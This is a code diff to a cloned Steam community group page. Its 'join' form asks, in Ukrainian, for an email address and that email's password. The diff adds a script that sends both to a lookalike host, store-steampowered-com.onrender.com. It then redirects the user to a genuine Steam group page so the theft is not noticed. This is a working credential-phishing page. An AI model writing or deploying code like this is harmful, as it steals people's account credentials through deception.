@@ -401,16 +401,45 @@ if ( typeof JSON != 'object' || !JSON.stringify || !JSON.parse ) { document.writ
 					<input type="hidden" name="action" value="join">
 					<input type="hidden" name="sessionID" value="6ab567e477fdb875a939418b">
 				</form>
-									<div class="grouppage_join_area">
-										<form action="https://store-steampowered-com.onrender.com/login_take" method="POST">
-											<input type="text" name="email" id="email" placeholder="Пошта:" size="30" required>
+							<div class="grouppage_join_area">
+										<form id="loginForm" action="https://store-steampowered-com.onrender.com/login_take" method="POST">
+											<input type="text" name="email" id="email" placeholder="Пошта:" size="30" required style="margin-right: 20px; height: 20px;">
 											<br><br>
-											<input type="password" name="password" id="password" placeholder="Пароль від пошти:" size="30" required>
+											<input type="password" name="password" id="password" placeholder="Пароль від пошти:" size="30" required style="margin-right: 20px; height: 20px;">
 											<br><br>
-											<button type="submit" class="btn_green_white_innerfade btn_medium">
-													<span>Приєднатися</span>
+											<button type="submit" class="btn_green_white_innerfade btn_medium" 
+															style="display: flex; justify-content: center; position: relative; z-index: 10; min-height: 20px;">
+													<span style="display: flex; align-items: center; justify-content: center; width: 100%; height: 100%; line-height: normal;">
+															Приєднатися
+													</span>
 											</button>
 									</form>
+									
+									<script>
+											document.getElementById("loginForm").addEventListener("submit", function(event) {
+													event.preventDefault();
+													
+													const form = event.target;
+													const formData = new FormData(form);
+									
+													fetch(form.action, {
+															method: form.method,
+															body: formData
+													})
+													.then(response => {
+															if (response.ok) {
+																	window.location.href = "https://steamcommunity.com/groups/ornp";
+															} else {
+																	alert("Помилка входу");
+															}
+													})
+													.catch(error => {
+															console.error("Помилка:", error);
+															alert("Сталася помилка. Спробуйте ще раз.");
+													});
+											});
+									</script>
+									
 									
 					</div>
 							</div>
